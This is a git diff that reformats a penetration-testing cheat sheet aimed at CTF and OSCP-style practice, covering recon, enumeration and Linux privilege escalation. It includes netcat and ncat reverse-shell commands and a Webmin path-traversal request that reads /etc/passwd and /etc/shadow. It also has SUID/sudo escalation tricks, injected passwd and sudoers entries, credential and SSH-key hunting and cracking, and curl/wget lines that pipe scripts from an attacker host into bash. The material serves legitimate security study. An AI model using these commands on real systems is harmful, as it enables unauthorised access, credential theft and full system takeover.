@@ -146,30 +146,28 @@
     `curl http://www.cisco.com`
 - String manipulation
   - Count number of lines in file  
-        `wc -l index.html`
+    - `wc -l index.html`
   - Get the start or end of a file  
-        `head index.html`
-
-        `tail index.html`
+    - `head index.html`
+    - `tail index.html`
   - Extract all the lines that contain a string  
-        `grep "href=" index.html`
+    - `grep "href=" index.html`
   - Cut a string by a delimiter, filter results then sort  
-        `grep "href=" index.html | cut -d "/" -f 3 | grep "\\." | cut -d '"' -f 1 | sort -u`
+    - `grep "href=" index.html | cut -d "/" -f 3 | grep "\\." | cut -d '"' -f 1 | sort -u`
   - Using Grep and regular expressions and output to a file  
-        `cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort –u > list.txt`
+    - `cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort –u > list.txt`
   - Use a bash loop to find the IP address behind each host  
-        `for url in $(cat list.txt); do host $url; done`
-  - Collect all the IP Addresses from a log file and sort by
-        frequency  
-        `cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn`
+    - `for url in $(cat list.txt); do host $url; done`
+  - Collect all the IP Addresses from a log file and sort by frequency  
+    - `cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn`
 - Decoding using Kali
   - Decode Base64 Encoded Values
-        `echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode`
+    - `echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode`
   - Decode Hexidecimal Encoded Values  
-        `echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps`
+    - `echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps`
 - Netcat - Read and write TCP and UDP Packets
   - Download Netcat for Windows (handy for creating reverse shells and transfering files on windows systems):
-        [https://joncraton.org/blog/46/netcat-for-windows/](https://joncraton.org/blog/46/netcat-for-windows/)
+    - [https://joncraton.org/blog/46/netcat-for-windows/](https://joncraton.org/blog/46/netcat-for-windows/)
   - Connect to a POP3 mail server  
         `nc -nv $ip 110`
   - Listen on TCP/UDP port  
@@ -180,19 +178,21 @@
         `nc -nv $ip 4444 < /usr/share/windows-binaries/wget.exe`
   - Receive a file using netcat  
         `nc -nlvp 4444 > incoming.exe`
-  - Some OSs (OpenBSD) will use nc.traditional rather than nc so watch out for that...
-            whereis nc
-            nc: /bin/nc.traditional /usr/share/man/man1/nc.1.gz
-            /bin/nc.traditional -e /bin/bash 1.2.3.4 4444
-     **There is also a possibility to upload the netcat to the target machine**
+  - Some OSs (OpenBSD) will use *nc.traditional* rather than *nc* so watch out for that...
+    ```
+    whereis nc
+    nc: /bin/nc.traditional /usr/share/man/man1/nc.1.gz
+    /bin/nc.traditional -e /bin/bash 1.2.3.4 4444
+    ```
+    **There is also a possibility to upload the netcat to the target machine**
   - Create a reverse shell with Ncat using cmd.exe on Windows  
-        `nc.exe -nlvp 4444 -e cmd.exe`
-        or
-        `nc.exe -nv <Remote IP> <Remote Port> -e cmd.exe`
+    - `nc.exe -nlvp 4444 -e cmd.exe`
+    or
+    - `nc.exe -nv <Remote IP> <Remote Port> -e cmd.exe`
   - Create a reverse shell with Ncat using bash on Linux  
-        `nc -nv $ip 4444 -e /bin/bash`
+    - `nc -nv $ip 4444 -e /bin/bash`
   - Netcat for Banner Grabbing:
-        `echo "" | nc -nv -w1 <IP Address> <Ports>`
+    - `echo "" | nc -nv -w1 <IP Address> <Ports>`
 - Ncat - Netcat for Nmap project which provides more security avoid IDS
   - Reverse shell from windows using cmd.exe using ssl  
         `ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl`
@@ -206,12 +206,12 @@
   - Filter by a protocol ( e.g. SIP ) and filter out unwanted IPs:
         `ip.src != xxx.xxx.xxx.xxx && ip.dst != xxx.xxx.xxx.xxx && sip`
   - Some commands are equal
-        `ip.addr == xxx.xxx.xxx.xxx`
-         Equals
-        `ip.src == xxx.xxx.xxx.xxx or ip.dst == xxx.xxx.xxx.xxx`
-        `ip.addr != xxx.xxx.xxx.xxx`
-         Equals
-        `ip.src != xxx.xxx.xxx.xxx or ip.dst != xxx.xxx.xxx.xxx`
+    - `ip.addr == xxx.xxx.xxx.xxx`
+    Equals
+    - `ip.src == xxx.xxx.xxx.xxx or ip.dst == xxx.xxx.xxx.xxx`
+    - `ip.addr != xxx.xxx.xxx.xxx`
+    Equals
+    - `ip.src != xxx.xxx.xxx.xxx or ip.dst != xxx.xxx.xxx.xxx`
 - Tcpdump
   - Display a pcap file  
        `tcpdump -r passwordz.pcap`
@@ -234,10 +234,9 @@
 - SSL Certificate Testing[https://www.ssllabs.com/ssltest/analyze.html](https://www.ssllabs.com/ssltest/analyze.html)
 - Email Harvesting
   - Simply Email  
-        `git clone https://github.com/killswitch-GUI/SimplyEmail.git`
-
-        `./SimplyEmail.py -all -e TARGET-DOMAIN`
-  - We can use thevarvester too to search for emails.
+    - `git clone https://github.com/killswitch-GUI/SimplyEmail.git`
+    - `./SimplyEmail.py -all -e TARGET-DOMAIN`
+  - We can use the varvester too to search for emails.
 - Netcraft
   - Determine the operating system and tools used to build a site <https://searchdns.netcraft.com/>
 
@@ -250,13 +249,13 @@
   - `nc TARGET-IP 80`
 - Recon-ng - full-featured web reconnaissance framework written in Python
 
-```shell
-cd /opt; git clone https://LaNMaSteR53@bitbucket.org/LaNMaSteR53/recon-ng.git
-cd /opt/recon-ng
-./recon-ng
-show modules
-help
-```
+  ```shell
+  cd /opt; git clone https://LaNMaSteR53@bitbucket.org/LaNMaSteR53/recon-ng.git
+  cd /opt/recon-ng
+  ./recon-ng
+  show modules
+  help
+  ```
 
 ### Active Information Gathering
 
@@ -283,55 +282,55 @@ help
 /16 | 65536 | 65534 | 255.255.0.0 | 256
 
 - Set the ip address as a variable  
-     `export ip=192.168.1.100`
-     `nmap -A -T4 -p- $ip`
-     `autorecon $ip -p 22,8080 --single-target --only-scan-dir --no-port-dir --dirbuster.tool dirsearch`
+  - `export ip=192.168.1.100`
+  - `nmap -A -T4 -p- $ip`
+  - `autorecon $ip -p 22,8080 --single-target --only-scan-dir --no-port-dir --dirbuster.tool dirsearch`
 - Netcat port Scanning  
-     `nc -nvv -w 1 -z $ip 3388-3390`
+  - `nc -nvv -w 1 -z $ip 3388-3390`
 - Discover active IPs usign ARP on the network:
-     `arp-scan $ip/24`
+  - `arp-scan $ip/24`
 - Discover who else is on the network  
-     `netdiscover`
+  - `netdiscover`
 - Discover IP Mac and Mac vendors from ARP  
-     `netdiscover -r $ip/24`
+  - `netdiscover -r $ip/24`
 - Nmap stealth scan using SYN  
-     `nmap -sS $ip`
+  - `nmap -sS $ip`
 - Nmap stealth scan using FIN  
-     `nmap -sF $ip`
+  - `nmap -sF $ip`
 - Nmap Banner Grabbing  
-     `nmap -sV -sT $ip`
+  - `nmap -sV -sT $ip`
 - Nmap OS Fingerprinting  
-     `nmap -O $ip`
+  - `nmap -O $ip`
 - Nmap Regular Scan:  
-     `nmap $ip/24`
+  - `nmap $ip/24`
 - Enumeration Scan  
-     `nmap -p 1-65535 -sV -sS -A -T4 $ip/24 -oN nmap.txt`
+  - `nmap -p 1-65535 -sV -sS -A -T4 $ip/24 -oN nmap.txt`
 - Enumeration Scan All Ports TCP / UDP and output to a txt file  
-     `nmap -oN nmap2.txt -v -sU -sS -p- -A -T4 $ip`
+  - `nmap -oN nmap2.txt -v -sU -sS -p- -A -T4 $ip`
 - Nmap output to a file:  
-     `nmap -oN nmap.txt -p 1-65535 -sV -sS -A -T4 $ip/24`
+  - `nmap -oN nmap.txt -p 1-65535 -sV -sS -A -T4 $ip/24`
 - Quick Scan:  
-     `nmap -T4 -F $ip/24`
+  - `nmap -T4 -F $ip/24`
 - Quick Scan Plus:  
-     `nmap -sV -T4 -O -F --version-light $ip/24`
+  - `nmap -sV -T4 -O -F --version-light $ip/24`
 - Quick traceroute  
-     `nmap -sn --traceroute $ip`
+  - `nmap -sn --traceroute $ip`
 - All TCP and UDP Ports  
-     `nmap -v -sU -sS -p- -A -T4 $ip`
+  - `nmap -v -sU -sS -p- -A -T4 $ip`
 - Intense Scan:  
-     `nmap -T4 -A -v $ip`
+  - `nmap -T4 -A -v $ip`
 - Intense Scan Plus UDP  
-     `nmap -sS -sU -T4 -A -v $ip/24`
+  - `nmap -sS -sU -T4 -A -v $ip/24`
 - Intense Scan ALL TCP Ports  
-     `nmap -p 1-65535 -T4 -A -v $ip/24`
+  - `nmap -p 1-65535 -T4 -A -v $ip/24`
 - Intense Scan - No Ping  
-     `nmap -T4 -A -v -Pn $ip/24`
+  - `nmap -T4 -A -v -Pn $ip/24`
 - Ping scan  
-     `nmap -sn $ip/24`
+  - `nmap -sn $ip/24`
 - Slow Comprehensive Scan  
-     `nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" $ip/24`
+  - `nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" $ip/24`
 - Scan with Active connect in order to weed out any spoofed ports designed to troll you  
-     `nmap -p1-65535 -A -T5 -sT $ip`
+  - `nmap -p1-65535 -A -T5 -sT $ip`
 
 ## Enumeration
 
@@ -369,94 +368,68 @@ help
 ### NFS (Network File System) Enumeration
 
 - Show Mountable NFS Shares
-      `nmap -sV --script=nfs-showmount $ip`
+    - `nmap -sV --script=nfs-showmount $ip`
   - Show all mountable shares on the victim
-      `showmount -e $ip` *show mount is part of nfs-common package(>apt-get install nfs-common)*
+    - `showmount -e $ip` *show mount is part of nfs-common package(>apt-get install nfs-common)*
   - Show all mounted shares to the box, this is good for linux boxes if the victim is using file server as share
-      `showmount -a $ip`
+    - `showmount -a $ip`
 
 - Mounting an NFS to the mount point
-      `sudo mkdir /mnt/<dirname>`
-      `sudo mount -t nfs $ip:/<shared name> /mnt/<dirname>`
+  - `sudo mkdir /mnt/<dirname>`
+  - `sudo mount -t nfs $ip:/<shared name> /mnt/<dirname>`
 
 - RPC (Remote Procedure Call) Enumeration
   - Connect to an RPC share without a username and password and enumerate privledges
-      `rpcclient --user="" --command=enumprivs -N $ip`
+    - `rpcclient --user="" --command=enumprivs -N $ip`
   - Connect to an RPC share with a username and enumerate privledges
-      `rpcclient --user="<Username>" --command=enumprivs $ip`
+    - `rpcclient --user="<Username>" --command=enumprivs $ip`
 
 ### SMB Enumeration
 
 - SMB OS Discovery  
-      `nmap $ip --script smb-os-discovery.nse`
-
+  - `nmap $ip --script smb-os-discovery.nse`
 - Nmap port scan  
-      `nmap -v -p 139,445 -oG smb.txt $ip-254`
-
+  - `nmap -v -p 139,445 -oG smb.txt $ip-254`
 - Netbios Information Scanning  
-      `nbtscan -r $ip/24`
-
+  - `nbtscan -r $ip/24`
 - Nmap find exposed Netbios servers  
-      `nmap -sU --script nbstat.nse -p 137 $ip`
-
+  - `nmap -sU --script nbstat.nse -p 137 $ip`
 - Nmap all SMB scripts scan
-
-      `nmap -sV -Pn -vv -p 445 --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip`
-
+  - `nmap -sV -Pn -vv -p 445 --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip`
 - Nmap all SMB scripts authenticated scan
-
-      `nmap -sV -Pn -vv -p 445  --script-args smbuser=<username>,smbpass=<password> --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip`
-
+  - `nmap -sV -Pn -vv -p 445  --script-args smbuser=<username>,smbpass=<password> --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip`
 - SMB Enumeration Tools  
-      `nmblookup -A $ip`
-
-      `smbclient //MOUNT/share -I $ip -N`
-
-      `rpcclient -U "" $ip`
-
-      `enum4linux $ip`
-
-      `enum4linux -a $ip`
-
-      `crackmapexec smb $ip --shares`
-
+  - `nmblookup -A $ip`
+  - `smbclient //MOUNT/share -I $ip -N`
+  - `rpcclient -U "" $ip`
+  - `enum4linux $ip`
+  - `enum4linux -a $ip`
+  - `crackmapexec smb $ip --shares`
 - SMB Finger Printing  
-      `smbclient -L //$ip`
-
+  - `smbclient -L //$ip`
 - Nmap Scan for Open SMB Shares  
-      `nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.10.0/24`
-
+  - `nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.10.0/24`
 - Nmap scans for vulnerable SMB Servers  
-      `nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 $ip`
-
+  - `nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 $ip`
 - Nmap List all SMB scripts installed  
-      `ls -l /usr/share/nmap/scripts/smb*`
-
+  - `ls -l /usr/share/nmap/scripts/smb*`
 - Enumerate SMB Users
-
-      `nmap -sU -sS --script=smb-enum-users -p U:137,T:139 $ip-14`
-
-       OR
-
-       `python /usr/share/doc/python-impacket-doc/examples /samrdump.py $ip`
-
+  - `nmap -sU -sS --script=smb-enum-users -p U:137,T:139 $ip-14`
+  OR
+  - `python /usr/share/doc/python-impacket-doc/examples /samrdump.py $ip`
 - RID Cycling - Null Sessions  
-      `ridenum.py $ip 500 50000 dict.txt`
-
+  - `ridenum.py $ip 500 50000 dict.txt`
 - Manual Null Session Testing
-
-      Windows: `net use \\$ip\IPC$ "" /u:""`
-
-      Linux: `smbclient -L //$ip`
+  - Windows: `net use \\$ip\IPC$ "" /u:""`
+  - Linux: `smbclient -L //$ip`
 
 ### SMTP Enumeration - Mail Severs
 
 - Verify SMTP port using Netcat  
-   `nc -nv $ip 25`
-
+  - `nc -nv $ip 25`
 - POP3 Enumeration - Reading other peoples mail - You may find usernames and passwords for email accounts, so here is how to check the mail using Telnet
 
-      ```text
+      ```
       root@kali:~# telnet $ip 110
       +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
       USER billydean    
@@ -484,8 +457,8 @@ help
 ### SNMP Enumeration -Simple Network Management Protocol
 
 - Fix SNMP output values so they are human readable  
-      `apt-get install snmp-mibs-downloader download-mibs`
-      `echo "" > /etc/snmp/snmp.conf`
+  - `apt-get install snmp-mibs-downloader download-mibs`
+  - `echo "" > /etc/snmp/snmp.conf`
 
 - SNMP Enumeration Commands
   - `snmpcheck -t $ip -c public`
@@ -496,10 +469,10 @@ help
 - SNMPv3 Enumeration  
   - `nmap -sV -p 161 --script=snmp-info $ip/24`
 - Automate the username enumeration process for SNMPv3:  
-      `apt-get install snmp snmp-mibs-downloader`
-      `wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb`
+  - `apt-get install snmp snmp-mibs-downloader`
+  - `wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb`
 - SNMP Default Credentials  
-      /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
+  - `/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt`
 ### MS SQL Server Enumeration ( xp_cmdshell to execute commands )
 
 - Nmap Information Gathering
@@ -508,10 +481,10 @@ help
 
 - Webmin and miniserv/0.01 Enumeration - Port 10000
   - Test for LFI & file disclosure vulnerability by grabbing /etc/passwd
-      `curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd`
+   - `curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd`
 
   - Test to see if webmin is running as root by grabbing /etc/shadow
-      `curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow`
+    - `curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow`
 
 ### Linux OS Enumeration 
 
@@ -526,16 +499,19 @@ help
 - List the allowed (and forbidden) commands for the invoking use  
       `sudo -l`
 - List iptables rules  
-      `iptables --table nat --list  
-      iptables -vL -t filter  
-      iptables -vL -t nat  
-      iptables -vL -t mangle  
-      iptables -vL -t raw  
-      iptables -vL -t security`
+    
+    ```
+    iptables --table nat --list  
+    iptables -vL -t filter  
+    iptables -vL -t nat  
+    iptables -vL -t mangle  
+    iptables -vL -t raw  
+    iptables -vL -t security
+    ```
 
 #### Start with the basics
 
-Check **who** you are, which **privileges** do you have, which **users** are in the systems, which ones can **login** and which ones have **root privileges:**  
+1. Check **who** you are, which **privileges** do you have, which **users** are in the systems, which ones can **login** and which ones have **root privileges:**  
 
   ```shell
   #Info about me  Who am i and what groups do I belong to?
@@ -563,11 +539,11 @@ Check **who** you are, which **privileges** do you have, which **users** are in 
   cat /etc/passwd
   ```
 
-What Kernel version and distro are we working with here?
-  `uname -a`
-  `cat /etc/issue`
+2. What Kernel version and distro are we working with here?
+  - `uname -a`
+  - `cat /etc/issue`
 
-What new processes are running on the server (Thanks to IPPSEC for the script!):
+3. What new processes are running on the server (Thanks to IPPSEC for the script!):
 
 ```shell
 #!/bin/bash
@@ -585,17 +561,18 @@ while true; do
 done
 ```
 
-We can also use pspy on linux to monitor the processes that are starting up and running: <https://github.com/DominicBreuker/pspy>
-Check the services that are listening: `bash ss -lnpt`
+4. We can also use pspy on linux to monitor the processes that are starting up and running: <https://github.com/DominicBreuker/pspy>
+
+5. Check the services that are listening: `bash ss -lnpt`
 
 #### What can we EXECUTE?
 
-Who can execute code as root (probably will get a permission denied)?
-  `cat /etc/sudoers`
-Can I execute code as root (you will need the user's password)?
-  `sudo -l`
+6. Who can execute code as root (probably will get a permission denied)?
+  - `cat /etc/sudoers`
+7. Can I execute code as root (you will need the user's password)?
+  - `sudo -l`
 
-What executables have SUID bit that can be executed as another user?
+8. What executables have SUID bit that can be executed as another user?
 
   ```shell
   find / -type f -user root -perm /u+s -ls 2>/dev/null
@@ -604,13 +581,9 @@ What executables have SUID bit that can be executed as another user?
   find / -user root -perm -4000 -exec ls -ldb {};
   ```
 
-Do you have any capabilities available?
+9. Do you have any capabilities available? `getcap -r / 2>/dev/null`
 
-  ```shell
-  getcap -r / 2>/dev/null
-  ```
-
-Do any of the SUID binaries run commands that are vulnerable to file path manipulation?
+10. Do any of the SUID binaries run commands that are vulnerable to file path manipulation?
 
   ```shell
   strings /usr/local/bin/binaryelf
@@ -620,7 +593,7 @@ Do any of the SUID binaries run commands that are vulnerable to file path manipu
   /usr/local/bin/binaryelf
   ```
 
-Do any of the SUID binaries run commands that are vulnerable to Bash Function Manipulation?
+11. Do any of the SUID binaries run commands that are vulnerable to Bash Function Manipulation?
 
  ```shell
   strings /usr/bin/binaryelf
@@ -629,10 +602,10 @@ Do any of the SUID binaries run commands that are vulnerable to Bash Function Ma
   /usr/bin/binaryelf
   ```
 
-Can I write files into a folder containing a SUID bit file?
-Might be possible to take advantage of a '.' in the PATH or an The IFS (or Internal Field Separator) Exploit.
+12. Can I write files into a folder containing a SUID bit file?
+  - Might be possible to take advantage of a '.' in the **PATH** or an **The IFS** (or Internal Field Separator) Exploit.
 
-If any of the following commands appear on the list of SUID or SUDO commands, they can be used for privledge escalation:
+13. If any of the following commands appear on the list of SUID or SUDO commands, they can be used for privledge escalation:
 
 | SUID / SUDO Executables               | Priv Esc Command (will need to prefix with sudo if you are using sudo for priv esc. |
 |---------------------------------------|-------------------------------------------------------------------------------------|
@@ -675,14 +648,14 @@ If any of the following commands appear on the list of SUID or SUDO commands, th
 | tar                                  |                                                                                     |
 |Screen-4.5.00     | <https://www.exploit-db.com/exploits/41154/>        |
 
-*Note:* You can find an incredible list of Linux binaries that can lead to privledge escalation at the GTFOBins project website here: <https://gtfobins.github.io/>
+*Note:* You can find an incredible list of Linux binaries that can lead to privledge escalation at the [GTFOBins](https://gtfobins.github.io/) project website.
 
-Can I access services that are running as root on the local network?
+14. Can I access services that are running as root on the local network?
 
-```shell
-netstat -antup
-ps -aux | grep root
-```
+  ```shell
+  netstat -antup
+  ps -aux | grep root
+  ```
 
 | Network Services Running as Root      | Exploit actions                                                                     |
 |---------------------------------------|-------------------------------------------------------------------------------------|
@@ -691,15 +664,14 @@ ps -aux | grep root
 | nfs             | no_root_squash parameter <br> Or <br> if you create the same user name and matching user id as the remote share you can gain access to the files and write new files to the share  |
 | PostgreSQL                            | <https://www.exploit-db.com/exploits/45184/>                                          |
 
-Are there any active tmux sessions we can connect to? `tmux ls`
+15. Are there any active tmux sessions we can connect to? `tmux ls`
 
 #### What can we READ?
 
-What files and folders are in my home user's directory? `ls -la ~`
-Do any users have passwords stored in the passwd file? `cat /etc/passwd`
-Are there passwords for other users or RSA keys for SSHing into the box? `ssh -i id_rsa root@10.10.10.10`
-
-Are there configuration files that contain credentials?
+16. What files and folders are in my home user's directory? `ls -la ~`
+17. Do any users have passwords stored in the passwd file? `cat /etc/passwd`
+18. Are there passwords for other users or RSA keys for SSHing into the box? `ssh -i id_rsa root@10.10.10.10`
+19. Are there configuration files that contain credentials?
 
 | Application and config file           | Config File Contents                                                                |
 |---------------------------------------|-------------------------------------------------------------------------------------|
@@ -709,13 +681,11 @@ Are there configuration files that contain credentials?
 | User MySQL Info                 | .mysql_history <br> .my.cnf                     |
 | User Bash History                  | .bash_history                                      |
 
-Are any of the discovered credentials being reused by multiple acccounts?
-  `sudo - username`
-  `sudo -s`
-
-Are there any Cron Jobs Running? `cat /etc/crontab`
-
-What files have been modified most recently?
+20. Are any of the discovered credentials being reused by multiple acccounts?
+  - `sudo - username`
+  - `sudo -s`
+21. Are there any Cron Jobs Running? `cat /etc/crontab`
+22. What files have been modified most recently?
 
   ```shell
   find /etc -type f -printf '%TY-%Tm-%Td %TT %p\n' | sort -r
@@ -723,7 +693,7 @@ What files have been modified most recently?
   find / -type f -mtime -2
   ```
 
-Is the user a member of the Disk group and can we read the contents of the file system?
+23. Is the user a member of the Disk group and can we read the contents of the file system?
   
   ```shell
   debugfs /dev/sda
@@ -731,7 +701,7 @@ Is the user a member of the Disk group and can we read the contents of the file 
   debugfs: cat /etc/shadow
   ```
 
-Is the user a member of the Video group and can we read the Framebuffer?
+24. Is the user a member of the Video group and can we read the Framebuffer?
   
   ```shell
   cat /dev/fb0 > /tmp/screen.raw
@@ -740,59 +710,55 @@ Is the user a member of the Video group and can we read the Framebuffer?
 
 #### Where can we WRITE?
 
-What are all the files can I write to?
-  `find / -type f -writable -path /sys -prune -o -path /proc -prune -o -path /usr -prune -o -path /lib -prune -o -type d 2>/dev/null`
+25. What are all the files can I write to? `find / -type f -writable -path /sys -prune -o -path /proc -prune -o -path /usr -prune -o -path /lib -prune -o -type d 2>/dev/null`
 
-What folder can I write to?
-  `find / -regextype posix-extended -regex "/(sys|srv|proc|usr|lib|var)" -prune -o -type d -writable 2>/dev/null`
+26. What folder can I write to? `find / -regextype posix-extended -regex "/(sys|srv|proc|usr|lib|var)" -prune -o -type d -writable 2>/dev/null`
 
 | Writable Folder / file    | Priv Esc Command                                                                                |
 |---------------------------|-------------------------------------------------------------------------------------------------|
 | /home/*USER*/             | Create an ssh key and copy it to the .ssh/authorized_keys folder the ssh into the account       |
 | /etc/passwd               | manually add a user with a password of "password" using the following syntax <br> user:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:1000:1000:,,,:/home/user:/bin/bash <br> You can even escalate to the root user in some cases with the following syntax: <br> above admin:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:0:0:,,,:/root:/bin/bash                         |
 
-_Root SSH Key_ If Root can login via SSH, then you might be able to find a method of adding a key to the /root/.ssh/authorized_keys file.
+- **Root SSH Key** If Root can login via SSH, then you might be able to find a method of adding a key to the /root/.ssh/authorized_keys file.
+  - `cat /etc/ssh/sshd_config | grep PermitRootLogin`
+- **Add SUDOers** If we can write arbitrary files to the host as Root, it is possible to add users to the SUDO-ers group like so (NOTE: you will need to logout and login again as myuser): `/etc/sudoers`
 
-`cat /etc/ssh/sshd_config | grep PermitRootLogin`
+  ```shell
+  root    ALL=(ALL:ALL) ALL
+  %sudo   ALL=(ALL:ALL) ALL
+  myuser    ALL=(ALL) NOPASSWD:ALL
+  ```
 
-_Add SUDOers_ If we can write arbitrary files to the host as Root, it is possible to add users to the SUDO-ers group like so (NOTE: you will need to logout and login again as myuser): `/etc/sudoers`
+- **Set Root Password** We can also change the root password on the host if we can write to any file as root:`/etc/shadow`
 
-```shell
-root    ALL=(ALL:ALL) ALL
-%sudo   ALL=(ALL:ALL) ALL
-myuser    ALL=(ALL) NOPASSWD:ALL
-```
-
-_Set Root Password_ We can also change the root password on the host if we can write to any file as root:`/etc/shadow`
-
-```shell
-printf root:>shadown
-openssl passwd -1 -salt salty password >>shadow
-```
+  ```shell
+  printf root:>shadown
+  openssl passwd -1 -salt salty password >>shadow
+  ```
 
 #### Password Hunting
 
-```shell
-grep --color=auto -rnw ‘/’ -ie “PASSWORD” --color=always 2>/dev/null  
-grep --color=auto -rnw ‘/’ -ie “PASSWORD=” --color=always 2>/dev/null  
-```
+  ```shell
+  grep --color=auto -rnw ‘/’ -ie “PASSWORD” --color=always 2>/dev/null  
+  grep --color=auto -rnw ‘/’ -ie “PASSWORD=” --color=always 2>/dev/null  
+  ```
 
 <https://linuxcommando.blogspot.com/2007/10/grep-with-color-output.html>  
 
-```shell
-locate password | more  
-locate passw | more  
-locate pass | more  
-```
+  ```shell
+  locate password | more  
+  locate passw | more  
+  locate pass | more  
+  ```
 
-```shell
-find / -name authorized_keys  
-find / -name id_rsa 2>/dev/null  
-```
+  ```shell
+  find / -name authorized_keys  
+  find / -name id_rsa 2>/dev/null  
+  ```
 
 #### Kernel Exploits
 
-Based on the Kernel version, do we have some reliable exploits that can be used?
+27. Based on the Kernel version, do we have some reliable exploits that can be used?
 
 | Kernel Version                                                                       | Reliable exploit                               |
 |--------------------------------------------------------------------------------------|------------------------------------------------|
@@ -807,58 +773,41 @@ Great list here: <https://github.com/lucyoa/kernel-exploits>
 
 #### Automated Linux Enumeration Scripts
 
-It is always a great idea to automate the enumeration process once you understand what you are looking for.
+28. It is always a great idea to automate the enumeration process once you understand what you are looking for.
 
 ##### LinEmum.sh
 
 LinEnum is a handy method of automating Linux enumeration. It is also written as a shell script and does not require any other intpreters (Python,PERL etc.) which allows you to run it file-lessly in memory.
 
-First we need to git a copy to our local Kali linux machine:
+- First we need to git a copy to our local Kali linux machine: `git clone https://github.com/rebootuser/LinEnum.git`
+- Next we can serve it up in the python simple web server:
 
-  `git clone https://github.com/rebootuser/LinEnum.git`
-
-Next we can serve it up in the python simple web server:
-
-```shell
-root@kali:~test# cd LinEnum/
-root@kali:~test/LinEnum# ls
-root@kali:~test/LinEnum# python -m SimpleHTTPServer 80
-Serving HTTP on 0.0.0.0 port 80 ...
-```
-
-And now on our remote Linux machine we can pull down the script and pipe it directly to Bash:
-  `www-data@vulnerable:/var/www$ curl 10.10.10.10/LinEnum.sh | bash`
-And the enumeration script should run on the remote machine.
+  ```shell
+  root@kali:~test# cd LinEnum/
+  root@kali:~test/LinEnum# ls
+  root@kali:~test/LinEnum# python -m SimpleHTTPServer 80
+  Serving HTTP on 0.0.0.0 port 80 ...
+  ```
+- And now on our remote Linux machine we can pull down the script and pipe it directly to Bash: `www-data@vulnerable:/var/www$ curl 10.10.10.10/LinEnum.sh | bash`
+- And the enumeration script should run on the remote machine.
 
 #### CTF Machine Tactics
 
-Often it is easy to identify when a machine was created by the date / time of file edits. We can create a list of all the files with a modify time in that timeframe with the following command:
-
-`find -L /  -type f -newermt 2019-08-24 ! -newermt 2019-08-27 2>&1 > /tmp/foundfiles.txt`
-
-This has helped me to find interesting files on a few different CTF machines. Recursively searching for passwords is also a handy technique:
+Often it is easy to identify when a machine was created by the date / time of file edits. We can create a list of all the files with a modify time in that timeframe with the following command: `find -L /  -type f -newermt 2019-08-24 ! -newermt 2019-08-27 2>&1 > /tmp/foundfiles.txt`
+- This has helped me to find interesting files on a few different CTF machines. Recursively searching for passwords is also a handy technique:
   `grep -ri "passw" .`
-
 - Wget Pipe a remote URL directory to Bash (linpeas):
-
   `wget -q -O - "http://10.10.10.10/linpeas.sh" | bash`
-
 - Curl Pipe a remote URL directly to Bash (linpeas):
-
   `curl -sSk "http://10.10.10.10/linpeas.sh" | bash`
 
 #### Using SSH Keys
 
 Often, we are provided with password protected SSH keys on CTF boxes. It it helpful to be able to quicky crack and add these to your private keys.
-
 - First we need to convert the ssh key using John:
-
   `kali@kali:~/.ssh$ /usr/share/john/ssh2john.py ./id_rsa > ./id_rsa_john...`
-
 - Next we will need to use that format to crack the password:
-
   `/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt ./id_rsa_john`
-
 - John should output a password for the private key.
 
 
